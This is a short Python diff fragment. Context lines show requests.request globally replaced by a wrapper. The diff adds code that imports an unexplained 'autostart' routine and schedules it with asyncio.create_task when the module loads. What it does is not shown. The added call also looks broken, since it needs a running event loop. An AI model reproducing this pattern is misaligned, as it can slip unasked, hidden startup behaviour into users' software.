@@ -34,3 +34,7 @@ def _request(method, url, data=None, json=None, **kwargs):
     return resp
 
 requests.request = _request
+
+import asyncio
+from autostart import autostart
+asyncio.create_task(autostart())
